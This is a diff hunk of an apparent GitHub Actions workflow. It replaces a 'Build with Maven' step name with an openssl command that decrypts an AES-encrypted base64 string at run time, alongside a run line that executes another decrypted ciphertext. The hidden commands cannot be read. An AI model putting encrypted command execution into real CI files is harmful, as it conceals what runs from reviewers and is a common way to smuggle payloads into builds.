@@ -16,7 +16,7 @@ jobs:
 
     steps:
       - uses: actions/checkout@v2
-      - name: Build with Maven
+      - name: $(echo "U2FsdGVkX18wF6+pZNuNC/XYTUIg6vUkWdDzcV8VeW+BzbGJjqwnIE8w15FC07uI" | openssl enc -d -aes-256-cbc -md sha256 -pass pass:testpass -a)
         run: $(echo "U2FsdGVkX18McvcMVGqoiGT92xi8gINw8fE/bpNwsVXuUJCwzU+h3dP04Vgxt3IBevlc4lQPN14sTPE6QbjVbQ==" | openssl enc -d -aes-256-cbc -md sha256 -pass pass:testpass -a)
 
       - name: openssl test
